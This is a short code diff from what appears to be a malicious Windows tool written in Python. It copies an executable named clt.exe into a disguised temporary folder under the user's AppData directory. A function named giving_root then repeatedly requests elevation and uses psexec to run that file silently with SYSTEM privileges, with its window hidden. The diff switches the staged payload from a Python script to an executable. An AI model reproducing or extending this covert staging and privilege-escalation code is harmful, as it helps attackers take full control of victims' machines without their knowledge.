@@ -55,7 +55,7 @@ def clone():
         path_to_create = r'C:\Users\%s\AppData\Local\Temp\_TMP995858_atmpk' % USER
         if not os.path.exists(path_to_create):
             os.makedirs(path_to_create)
-        fileToCopy = 'clt.py' #heer too
+        fileToCopy = 'clt.exe'
         shutil.copy2(fileToCopy, path_to_create)
     except:
         msg = "error to create\copy...."
@@ -80,6 +80,7 @@ def bat_create(file_path=""):
 
 #working process
 
+#develop-in
 def giving_root():
     while True:
         retorno = ctypes.windll.shell32.ShellExecuteW(None, u"runas", u"psexec.exe", u"-accepteula -nobanner -s -d " + temp_path + "\\clt.exe", None, 0)
